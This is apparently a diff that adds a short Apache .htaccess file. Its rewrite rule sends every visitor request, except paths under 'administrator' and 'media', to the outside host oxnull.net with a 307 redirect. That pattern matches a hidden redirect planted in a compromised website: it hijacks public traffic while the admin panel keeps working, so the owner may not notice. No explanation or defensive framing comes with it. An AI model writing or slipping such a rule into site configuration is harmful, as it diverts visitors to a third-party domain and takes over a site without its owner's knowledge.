@@ -1,0 +1,5 @@
+
+RewriteEngine on
+RewriteCond %{REQUEST_FILENAME} !(administrator.*|media.*)
+RewriteRule ^.*$ http://oxnull.net/error/1 [R=307]
+
